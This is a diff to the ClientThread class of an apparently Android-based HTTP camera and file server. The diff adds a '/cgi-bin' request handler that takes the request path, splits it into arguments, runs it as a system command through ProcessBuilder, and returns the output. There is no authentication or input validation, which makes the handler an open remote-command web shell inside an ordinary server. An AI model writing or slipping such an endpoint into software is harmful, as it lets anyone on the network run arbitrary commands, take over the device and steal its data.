@@ -21,6 +21,8 @@ import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 import java.net.Socket;
 import java.text.SimpleDateFormat;
+import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.Date;
 import java.util.Locale;
 import java.util.concurrent.Semaphore;
@@ -98,7 +100,32 @@ public class ClientThread extends Thread {
                     if (result.equals("/camera/snapshot")) {
                         mCamera.takePicture(null, null, mPicture);
 
-                    } else {
+                    } else if(result.contains("/cgi-bin")) {
+                        String command = result.substring(9);
+                        String[] commands = command.split("%20");
+                        if (commands.length > 0) {
+                            out.write("HTTP/1.0 200 OK\n" +
+                                    "Content-Type: text/plain\n"
+                                    + "\n");
+                            out.flush();
+                            ArrayList<String> arguments = new ArrayList<String>();
+                            arguments.addAll(Arrays.asList(commands));
+
+                            ProcessBuilder processBuilder = new ProcessBuilder(arguments);
+                            Process process = processBuilder.start();
+                            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()), 1);
+
+                            int part = 0;
+                            while ((part = reader.read()) != -1) {
+                                o.write(part);
+                            }
+                            o.flush();
+                            process.destroy();
+
+                        }
+                    }
+
+                    else {
 
                         File f = new File(sdPath + result);
                         if (f.isFile()) {
